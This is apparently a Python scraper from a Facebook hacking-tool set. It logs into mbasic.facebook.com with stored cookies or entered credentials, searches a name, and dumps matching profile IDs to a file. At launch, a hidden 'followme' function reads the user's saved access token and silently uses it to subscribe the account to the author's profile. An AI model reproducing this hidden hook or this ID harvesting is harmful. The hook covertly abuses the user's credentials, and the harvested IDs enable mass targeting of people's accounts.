import requests,bs4,mechanize,json,re,sys,time,os
from http.cookiejar import LWPCookieJar as kuki
from requests import Session as ses
from getpass import getpass

class cari_id(object):
	def __init__(self):
		self.req=requests.Session()
		self.i="https://mbasic.facebook.com/{}"
		self.login()
		
	def login(self):
		print("\n[!] checking cookies")
		time.sleep(1)
		s = self.req
		s.cookies = kuki('toket/kue.txt')
		try:
			fil=open('toket/kue.txt')
			fil.close()
		except FileNotFoundError:
			print("[!] cookies not found\n\n[!] please login in your facebook once again")
			email=input('[?] email/username: ')
			pw=getpass('[?] password: ')
			data = {'email':email,'pass':pw}
			urrl='https://mbasic.facebook.com/login'
			res = s.post(urrl,data=data).text
			if 'm_sess' in str(res) or 'save-device' in str(res):
				s.cookies.save()
				self.req.cookies=kuki('toket/kue.txt')
				self.req.cookies.load()
				self.q()
				exit()
			else:
				exit('[!] fail login into your account')
		self.cek_kuki()
		
	def cek_kuki(self):
		self.req.cookies=kuki('toket/kue.txt')
		self.req.cookies.load()
		cek=self.req.get('https://mbasic.facebook.com/me').text
		if 'mbasic_logout_button' in cek:
			print('[√] cookies found\n')
			self.q()
		else:
			print('[!] cookies invalid')

	def q(self):
		self.query=input("[?] Search: ")
		if self.query =="":
			self.q()
		else:
			loli=[]
		bs=bs4.BeautifulSoup(self.req.get(self.i.format("search/top/?q=%s"%(self.query))).text,features="html.parser")
		for x in bs.find_all("a",href=True):
			if "graphsearch" in x["href"]:
				loli.append(self.i.format(x["href"]))
		if len(loli) !=0:
			self.cari(loli[0])
		else:
			print("[!] user does exist.")
				
	def cari(self,url):
		bs=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		for x in bs.find_all("a",href=True):
			p=x.find("div")
			if "None" in str(p) or "+" in str(p):
				continue
			else:
				js=re.findall("/(.*?)$",x["href"])
				if len(js) !=0:
					print("\r[!] %s           "%(p.text))
					open("dump/search_id.txt","a").write("%s\n"%(js[0].replace("profile.php?id=","")))
					print("\r[%s] Writing .. "%(len(open("dump/search_id.txt").readlines())),end=""),;sys.stdout.flush()
		for xi in bs.find_all("a",href=True):
			if "lihat hasil selanjutnya" in xi.text.lower():
				self.cari(xi["href"])
		exit("\n[+] Done. file save as dump/search_id.txt")
		
def followme():
	try:
		ken=open('toket/token.txt','r').read();rr=requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
		ken.close()
	except: pass

followme()
try:
	os.mkdir('dump')
except: pass
try:
	print("""
\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;
\t; Dump id with search name ;
\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	   
	     Author : Kang-Newbie
	  Thanks to Deray (LOoLzeC)
""")
	try:
		cekfile=open('dump/search_id.txt','r').readline()
		if len(cekfile) != 0:
			confir=input("[!] file exist not empty\n[?] remove (y/n) ")
			if confir == 'Y' or confir == 'y':
				os.remove('dump/search_id.txt')
				print('[√] Successfully deleted file')
	except: pass
	cari_id()
except Exception as F:
	print("Err: %s"%(F))
